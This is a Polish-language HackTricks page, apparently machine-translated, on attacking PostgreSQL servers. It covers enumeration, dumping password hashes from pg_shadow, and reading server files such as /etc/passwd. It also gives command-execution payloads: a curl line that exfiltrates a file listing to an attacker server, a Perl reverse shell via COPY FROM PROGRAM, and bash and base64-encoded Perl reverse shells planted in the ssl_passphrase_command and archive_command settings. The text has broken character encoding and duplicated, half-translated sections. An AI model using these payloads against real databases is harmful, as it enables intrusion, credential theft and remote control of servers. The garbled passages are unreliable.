# 5432,5433 - Testowanie penetracyjne PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

**PostgreSQL** jest opisywany jako **system bazodanowy obiektowo-relacyjny**, ktÃ³ry jest **open source**. Ten system nie tylko wykorzystuje jÄ™zyk SQL, ale takÅ¼e go ulepsza, dodajÄ…c dodatkowe funkcje. Jego moÅ¼liwoÅ›ci pozwalajÄ… mu obsÅ‚ugiwaÄ‡ szeroki zakres typÃ³w danych i operacji, co czyni go wszechstronnym wyborem dla programistÃ³w i organizacji.

**DomyÅ›lny port:** 5432, a jeÅ›li ten port jest juÅ¼ uÅ¼ywany, wydaje siÄ™, Å¼e postgresql uÅ¼yje nastÄ™pnego portu (prawdopodobnie 5433), ktÃ³ry nie jest uÅ¼ywany.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## PoÅ‚Ä…czenie i podstawowe wyliczenia

### PoÅ‚Ä…czenie

Aby nawiÄ…zaÄ‡ poÅ‚Ä…czenie z serwerem PostgreSQL, moÅ¼na uÅ¼yÄ‡ narzÄ™dzia `psql` lub innych klientÃ³w PostgreSQL. PoniÅ¼ej przedstawiono przykÅ‚ad poÅ‚Ä…czenia z serwerem:

```bash
psql -h <adres_serwera> -p <port> -U <uÅ¼ytkownik> -d <baza_danych>
```

### Podstawowe wyliczenia

Po nawiÄ…zaniu poÅ‚Ä…czenia z serwerem PostgreSQL, moÅ¼na przeprowadziÄ‡ podstawowe wyliczenia, takie jak:

- WyÅ›wietlanie listy dostÄ™pnych baz danych:
```sql
\l
```

- Wybieranie konkretnej bazy danych:
```sql
\c <nazwa_bazy_danych>
```

- WyÅ›wietlanie listy tabel w bieÅ¼Ä…cej bazie danych:
```sql
\dt
```

- WyÅ›wietlanie schematu tabeli:
```sql
\d+ <nazwa_tabeli>
```

- WyÅ›wietlanie zawartoÅ›ci tabeli:
```sql
SELECT * FROM <nazwa_tabeli>;
```

- WyÅ›wietlanie informacji o indeksach tabeli:
```sql
\di+ <nazwa_tabeli>
```

- WyÅ›wietlanie informacji o funkcjach:
```sql
\df
```

- WyÅ›wietlanie informacji o uÅ¼ytkownikach:
```sql
\du
```

- WyÅ›wietlanie informacji o widokach:
```sql
\dv
```

- WyÅ›wietlanie informacji o sekwencjach:
```sql
\ds
```

- WyÅ›wietlanie informacji o typach danych:
```sql
\dT
```

- WyÅ›wietlanie informacji o operatorach:
```sql
\dO
```

- WyÅ›wietlanie informacji o rozszerzeniach:
```sql
\dx
```

- WyÅ›wietlanie informacji o tabelach systemowych:
```sql
\dS
```

- WyÅ›wietlanie informacji o widokach systemowych:
```sql
\dV
```

- WyÅ›wietlanie informacji o sekwencjach systemowych:
```sql
\dq
```

- WyÅ›wietlanie informacji o typach danych systemowych:
```sql
\dtS
```

- WyÅ›wietlanie informacji o operatorach systemowych:
```sql
\doS
```

- WyÅ›wietlanie informacji o rozszerzeniach systemowych:
```sql
\dxS
```

- WyÅ›wietlanie informacji o funkcjach systemowych:
```sql
\dfS
```

- WyÅ›wietlanie informacji o uÅ¼ytkownikach systemowych:
```sql
\duS
```

- WyÅ›wietlanie informacji o tabelach systemowych:
```sql
\dS
```

- WyÅ›wietlanie informacji o widokach systemowych:
```sql
\dV
```

- WyÅ›wietlanie informacji o sekwencjach systemowych:
```sql
\dq
```

- WyÅ›wietlanie informacji o typach danych systemowych:
```sql
\dtS
```

- WyÅ›wietlanie informacji o operatorach systemowych:
```sql
\doS
```

- WyÅ›wietlanie informacji o rozszerzeniach systemowych:
```sql
\dxS
```

- WyÅ›wietlanie informacji o funkcjach systemowych:
```sql
\dfS
```

- WyÅ›wietlanie informacji o uÅ¼ytkownikach systemowych:
```sql
\duS
```

To tylko kilka przykÅ‚adÃ³w podstawowych wyliczeÅ„, ktÃ³re moÅ¼na przeprowadziÄ‡ w PostgreSQL. Istnieje wiele innych polecenia, ktÃ³re moÅ¼na uÅ¼yÄ‡ do eksploracji bazy danych i uzyskania informacji o jej strukturze i zawartoÅ›ci.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
JeÅ›li wykonujÄ…c **`\list`** znajdziesz bazÄ™ danych o nazwie **`rdsadmin`**, to wiesz, Å¼e jesteÅ› wewnÄ…trz bazy danych **AWS PostgreSQL**.
{% endhint %}

Aby uzyskaÄ‡ wiÄ™cej informacji na temat **jak naduÅ¼ywaÄ‡ bazy danych PostgreSQL**, sprawdÅº:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Automatyczne wyliczanie
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Atak siÅ‚owy**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Skanowanie portÃ³w**

Zgodnie z [**tym badaniem**](https://www.exploit-db.com/papers/13084), gdy prÃ³ba poÅ‚Ä…czenia nie powiedzie siÄ™, `dblink` generuje wyjÄ…tek `sqlclient_unable_to_establish_sqlconnection`, zawierajÄ…cy wyjaÅ›nienie bÅ‚Ä™du. PoniÅ¼ej przedstawiono przykÅ‚ady tych szczegÃ³Å‚Ã³w.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host jest niedostÄ™pny

`SZCZEGÃ“ÅY: nie moÅ¼na poÅ‚Ä…czyÄ‡ siÄ™ z serwerem: Brak trasy do hosta. Czy serwer dziaÅ‚a na hoÅ›cie "1.2.3.4" i akceptuje poÅ‚Ä…czenia TCP/IP na porcie 5678?`

* Port jest zamkniÄ™ty
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Port jest otwarty
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
lub
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Port jest otwarty lub filtrowany
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
W funkcjach PL/pgSQL nie jest obecnie moÅ¼liwe uzyskanie szczegÃ³Å‚Ã³w dotyczÄ…cych wyjÄ…tkÃ³w. Jednak jeÅ›li masz bezpoÅ›redni dostÄ™p do serwera PostgreSQL, moÅ¼esz pobraÄ‡ potrzebne informacje. JeÅ›li wydobycie nazw uÅ¼ytkownikÃ³w i haseÅ‚ z tabel systemowych nie jest moÅ¼liwe, moÅ¼esz rozwaÅ¼yÄ‡ wykorzystanie metody ataku sÅ‚ownikowego omÃ³wionej w poprzednim rozdziale, poniewaÅ¼ moÅ¼e to potencjalnie przynieÅ›Ä‡ pozytywne rezultaty.

## Wyliczanie uprawnieÅ„

### Role

| Typy rÃ³l      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rola ma uprawnienia superuÅ¼ytkownika                                                                                                                        |
| rolinherit     | Rola automatycznie dziedziczy uprawnienia rÃ³l, do ktÃ³rych naleÅ¼y                                                                                    |
| rolcreaterole  | Rola moÅ¼e tworzyÄ‡ wiÄ™cej rÃ³l                                                                                                                           |
| rolcreatedb    | Rola moÅ¼e tworzyÄ‡ bazy danych                                                                                                                            |
| rolcanlogin    | Rola moÅ¼e siÄ™ zalogowaÄ‡. Oznacza to, Å¼e ta rola moÅ¼e byÄ‡ uÅ¼yta jako poczÄ…tkowy identyfikator autoryzacji sesji                                                     |
| rolreplication | Rola jest rolÄ… replikacji. Rola replikacji moÅ¼e inicjowaÄ‡ poÅ‚Ä…czenia replikacji oraz tworzyÄ‡ i usuwaÄ‡ gniazda replikacji.                           |
| rolconnlimit   | Dla rÃ³l, ktÃ³re mogÄ… siÄ™ zalogowaÄ‡, ustawia maksymalnÄ… liczbÄ™ rÃ³wnoczesnych poÅ‚Ä…czeÅ„, jakie ta rola moÅ¼e nawiÄ…zaÄ‡. WartoÅ›Ä‡ -1 oznacza brak limitu.                                 |
| rolpassword    | Nie jest to hasÅ‚o (zawsze odczytywane jako `********`)                                                                                                        |
| rolvaliduntil  | Czas wygaÅ›niÄ™cia hasÅ‚a (uÅ¼ywany tylko dla uwierzytelniania hasÅ‚em); null, jeÅ›li brak wygaÅ›niÄ™cia                                                                  |
| rolbypassrls   | Rola omija kaÅ¼dÄ… politykÄ™ zabezpieczeÅ„ na poziomie wiersza, zobacz [SekcjÄ™ 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) dla wiÄ™cej informacji. |
| rolconfig      | DomyÅ›lne wartoÅ›ci zmiennych konfiguracyjnych dla danej roli                                                                                          |
| oid            | ID roli                                                                                                                                           |

#### InteresujÄ…ce grupy

* JeÅ›li jesteÅ› czÅ‚onkiem **`pg_execute_server_program`**, moÅ¼esz **wykonywaÄ‡** programy
* JeÅ›li jesteÅ› czÅ‚onkiem **`pg_read_server_files`**, moÅ¼esz **czytaÄ‡** pliki
* JeÅ›li jesteÅ› czÅ‚onkiem **`pg_write_server_files`**, moÅ¼esz **pisaÄ‡** pliki

{% hint style="info" %}
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e w Postgresie **uÅ¼ytkownik**, **grupa** i **rola** to to samo. To zaleÅ¼y tylko od **sposobu uÅ¼ycia** i czy **pozwolisz na logowanie**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele

PostgreSQL uses tables to store data. A table is a collection of rows, where each row represents a single record and each column represents a specific attribute of that record.

To view the tables in a PostgreSQL database, you can use the following SQL query:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

This query retrieves the names of all tables in the `public` schema of the database.

To view the columns of a specific table, you can use the following SQL query:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';
```

Replace `table_name` with the name of the table you want to inspect.

### Tabele

PostgreSQL uÅ¼ywa tabel do przechowywania danych. Tabela to zbiÃ³r wierszy, gdzie kaÅ¼dy wiersz reprezentuje pojedynczy rekord, a kaÅ¼da kolumna reprezentuje okreÅ›lony atrybut tego rekordu.

Aby wyÅ›wietliÄ‡ tabele w bazie danych PostgreSQL, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego zapytania SQL:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

To zapytanie pobiera nazwy wszystkich tabel w schemacie `public` bazy danych.

Aby wyÅ›wietliÄ‡ kolumny konkretnej tabeli, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego zapytania SQL:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';
```

ZamieÅ„ `table_name` na nazwÄ™ tabeli, ktÃ³rÄ… chcesz sprawdziÄ‡.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcje

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be written in various programming languages such as SQL, PL/pgSQL, Python, etc.

Funkcje w PostgreSQL to nazwane bloki kodu, ktÃ³re moÅ¼na wykonaÄ‡, wywoÅ‚ujÄ…c ich nazwÄ™. SÅ‚uÅ¼Ä… do wykonywania okreÅ›lonych zadaÅ„ i mogÄ… przyjmowaÄ‡ parametry oraz zwracaÄ‡ wartoÅ›ci. Funkcje moÅ¼na tworzyÄ‡ za pomocÄ… instrukcji `CREATE FUNCTION` i moÅ¼na je pisaÄ‡ w rÃ³Å¼nych jÄ™zykach programowania, takich jak SQL, PL/pgSQL, Python itp.

#### Creating Functions

#### Tworzenie funkcji

To create a function, you need to specify the function name, input parameters (if any), return type, and the code block that defines the function's behavior. Here is the basic syntax for creating a function:

Aby utworzyÄ‡ funkcjÄ™, musisz okreÅ›liÄ‡ nazwÄ™ funkcji, parametry wejÅ›ciowe (jeÅ›li istniejÄ…), typ zwracany oraz blok kodu, ktÃ³ry definiuje zachowanie funkcji. Oto podstawowa skÅ‚adnia tworzenia funkcji:

```sql
CREATE FUNCTION function_name (parameter1 datatype, parameter2 datatype, ...)
  RETURNS return_type
  LANGUAGE language_name
AS
$$
  -- Function code goes here
$$;
```

The `function_name` is the name of the function, `parameter1`, `parameter2`, etc. are the input parameters with their respective data types, `return_type` is the data type of the value returned by the function, and `language_name` is the programming language used to write the function code.

`function_name` to nazwa funkcji, `parameter1`, `parameter2`, itd. to parametry wejÅ›ciowe wraz z ich odpowiednimi typami danych, `return_type` to typ danych zwracanych przez funkcjÄ™, a `language_name` to jÄ™zyk programowania uÅ¼ywany do pisania kodu funkcji.

#### Calling Functions

#### WywoÅ‚ywanie funkcji

Once a function is created, you can call it by using its name followed by the input parameter values (if any). The function will execute its code block and return the specified value.

Po utworzeniu funkcji moÅ¼na jÄ… wywoÅ‚aÄ‡, uÅ¼ywajÄ…c jej nazwy, a nastÄ™pnie wartoÅ›ci parametrÃ³w wejÅ›ciowych (jeÅ›li istniejÄ…). Funkcja wykona swÃ³j blok kodu i zwrÃ³ci okreÅ›lonÄ… wartoÅ›Ä‡.

```sql
SELECT function_name(parameter1, parameter2, ...);
```

#### Dropping Functions

#### Usuwanie funkcji

To remove a function from the database, you can use the `DROP FUNCTION` statement followed by the function name and its input parameter types (if any).

Aby usunÄ…Ä‡ funkcjÄ™ z bazy danych, moÅ¼na uÅ¼yÄ‡ instrukcji `DROP FUNCTION`, a nastÄ™pnie podaÄ‡ nazwÄ™ funkcji oraz jej typy parametrÃ³w wejÅ›ciowych (jeÅ›li istniejÄ…).

```sql
DROP FUNCTION function_name(parameter1 datatype, parameter2 datatype, ...);
```

It is important to note that dropping a function will permanently remove it from the database, so use this command with caution.

Warto zauwaÅ¼yÄ‡, Å¼e usuniÄ™cie funkcji spowoduje jej trwaÅ‚e usuniÄ™cie z bazy danych, dlatego uÅ¼ywaj tej komendy ostroÅ¼nie.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Akcje na systemie plikÃ³w

### Odczytywanie katalogÃ³w i plikÃ³w

Od tego [**commita**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) czÅ‚onkowie zdefiniowanej grupy **`DEFAULT_ROLE_READ_SERVER_FILES`** (zwanej **`pg_read_server_files`**) oraz **super uÅ¼ytkownicy** mogÄ… uÅ¼ywaÄ‡ metody **`COPY`** na dowolnej Å›cieÅ¼ce (sprawdÅº `convert_and_check_filename` w `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
PamiÄ™taj, Å¼e jeÅ›li nie jesteÅ› super uÅ¼ytkownikiem, ale masz uprawnienia **CREATEROLE**, moÅ¼esz **dodaÄ‡ siebie do tej grupy:**
```sql
GRANT pg_read_server_files TO username;
```
[**WiÄ™cej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

IstniejÄ… **inne funkcje postgres**, ktÃ³re moÅ¼na uÅ¼yÄ‡ do **odczytu pliku lub listowania katalogu**. Tylko **superuÅ¼ytkownicy** i **uÅ¼ytkownicy z wyraÅºnymi uprawnieniami** mogÄ… z nich korzystaÄ‡:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
MoÅ¼esz znaleÅºÄ‡ **wiÄ™cej funkcji** na stronie [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Proste zapisywanie plikÃ³w

Tylko **super uÅ¼ytkownicy** i czÅ‚onkowie grupy **`pg_write_server_files`** mogÄ… uÅ¼ywaÄ‡ polecenia copy do zapisywania plikÃ³w.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
PamiÄ™taj, Å¼e jeÅ›li nie jesteÅ› super uÅ¼ytkownikiem, ale masz uprawnienia **`CREATEROLE`**, moÅ¼esz **dodaÄ‡ siebie do tej grupy:**
```sql
GRANT pg_write_server_files TO username;
```
[**WiÄ™cej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

PamiÄ™taj, Å¼e COPY nie obsÅ‚uguje znakÃ³w nowej linii, dlatego nawet jeÅ›li uÅ¼ywasz Å‚adunku base64, **musisz wysÅ‚aÄ‡ jednolinijkowiec**.\
Bardzo waÅ¼nym ograniczeniem tej techniki jest to, Å¼e **`copy` nie moÅ¼e byÄ‡ uÅ¼ywane do zapisywania plikÃ³w binarnych, poniewaÅ¼ modyfikuje niektÃ³re wartoÅ›ci binarne**.

### **PrzesyÅ‚anie plikÃ³w binarnych**

Jednak istniejÄ… **inne techniki przesyÅ‚ania duÅ¼ych plikÃ³w binarnych:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**WskazÃ³wka dotyczÄ…ca bug bounty**: **Zarejestruj siÄ™** na platformie **Intigriti**, premium platformie **bug bounty stworzonej przez hakerÃ³w, dla hakerÃ³w**! DoÅ‚Ä…cz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) juÅ¼ dziÅ› i zacznij zarabiaÄ‡ nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE do programu**

Od [wersji 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) tylko **super uÅ¼ytkownicy** i czÅ‚onkowie grupy **`pg_execute_server_program`** mogÄ… uÅ¼ywaÄ‡ copy do RCE (przykÅ‚ad z eksfiltracjÄ…:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
PrzykÅ‚ad wykonania:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
PamiÄ™taj, Å¼e jeÅ›li nie jesteÅ› super uÅ¼ytkownikiem, ale masz uprawnienia **`CREATEROLE`**, moÅ¼esz **dodaÄ‡ siebie do tej grupy:**
```sql
GRANT pg_execute_server_program TO username;
```
[**WiÄ™cej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Lub uÅ¼yj moduÅ‚u `multi/postgres/postgres_copy_from_program_cmd_exec` z **metasploita**.\
WiÄ™cej informacji na temat tej podatnoÅ›ci [**tutaj**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Podczas zgÅ‚aszania jako CVE-2019-9193, Postges oÅ›wiadczyÅ‚, Å¼e jest to [funkcja i nie zostanie naprawiona](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE z jÄ™zykami PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE z rozszerzeniami PostgreSQL

Po **zapoznaniu siÄ™** z poprzednim postem **jak przesyÅ‚aÄ‡ pliki binarne**, moÅ¼esz sprÃ³bowaÄ‡ uzyskaÄ‡ **RCE przesyÅ‚ajÄ…c rozszerzenie PostgreSQL i je wczytujÄ…c**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE z plikiem konfiguracyjnym PostgreSQL

Plik **konfiguracyjny** PostgreSQL jest **zapisywalny** przez uÅ¼ytkownika **postgres**, ktÃ³ry uruchamia bazÄ™ danych, wiÄ™c jako **superuÅ¼ytkownik** moÅ¼esz zapisywaÄ‡ pliki w systemie plikÃ³w i tym samym moÅ¼esz **nadpisaÄ‡ ten plik**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE z ssl\_passphrase\_command**

WiÄ™cej informacji [o tej technice tutaj](https://pulsesecurity.co.nz/articles/postgres-sqli).

Plik konfiguracyjny ma kilka interesujÄ…cych atrybutÃ³w, ktÃ³re mogÄ… prowadziÄ‡ do RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` ÅšcieÅ¼ka do prywatnego klucza bazy danych
* `ssl_passphrase_command = ''` JeÅ›li plik prywatny jest chroniony hasÅ‚em (zaszyfrowany), PostgreSQL **wykona polecenie wskazane w tym atrybucie**.
* `ssl_passphrase_command_supports_reload = off` **JeÅ›li** ten atrybut jest **wÅ‚Ä…czony**, **polecenie** wykonane, jeÅ›li klucz jest chroniony hasÅ‚em, **zostanie wykonane** podczas wykonywania `pg_reload_conf()`.

NastÄ™pnie atakujÄ…cy musi:

1. **WydumpowaÄ‡ prywatny klucz** z serwera
2. **ZaszyfrowaÄ‡** pobrany prywatny klucz:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **NadpisaÄ‡**
4. **WydumpowaÄ‡** bieÅ¼Ä…cÄ… **konfiguracjÄ™** PostgreSQL
5. **NadpisaÄ‡** **konfiguracjÄ™** z konfiguracjÄ… wymienionych atrybutÃ³w:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. WykonaÄ‡ `pg_reload_conf()`

Podczas testowania zauwaÅ¼yÅ‚em, Å¼e to zadziaÅ‚a tylko wtedy, gdy **plik klucza prywatnego ma uprawnienia 640**, jest **wÅ‚asnoÅ›ciÄ… roota** i **grupy ssl-cert lub postgres** (aby uÅ¼ytkownik postgres mÃ³gÅ‚ go odczytaÄ‡) oraz znajduje siÄ™ w _/var/lib/postgresql/12/main_.

#### **RCE z archive\_command**

**WiÄ™cej** [**informacji na temat tej konfiguracji i o WAL tutaj**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Innym atrybutem w pliku konfiguracyjnym, ktÃ³ry moÅ¼na wykorzystaÄ‡, jest `archive_command`.

Aby to dziaÅ‚aÅ‚o, ustawienie `archive_mode` musi byÄ‡ `'on'` lub `'always'`. JeÅ›li tak jest, moÅ¼emy nadpisaÄ‡ polecenie w `archive_command` i zmusiÄ‡ je do wykonania za pomocÄ… operacji WAL (write-ahead logging).

OgÃ³lne kroki to:

1. SprawdÅº, czy tryb archiwizacji jest wÅ‚Ä…czony: `SELECT current_setting('archive_mode')`
2. Nadpisz `archive_command` za pomocÄ… payloadu. Na przykÅ‚ad, odwrÃ³cony shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. PrzeÅ‚aduj konfiguracjÄ™: `SELECT pg_reload_conf()`
4. WymuÅ› wykonanie operacji WAL, co spowoduje wywoÅ‚anie polecenia archiwizacji: `SELECT pg_switch_wal()` lub `SELECT pg_switch_xlog()` dla niektÃ³rych wersji Postgresa

## **PodwyÅ¼szanie uprawnieÅ„ w Postgres**

### PodwyÅ¼szanie uprawnieÅ„ CREATEROLE

#### **Grant**

Zgodnie z [**dokumentacjÄ…**](https://www.postgresql.org/docs/13/sql-grant.html): _Role posiadajÄ…ce uprawnienie **`CREATEROLE`** mogÄ… **udzielaÄ‡ lub odbieraÄ‡ czÅ‚onkostwo w dowolnej roli**, ktÃ³ra **nie jest** superuÅ¼ytkownikiem._

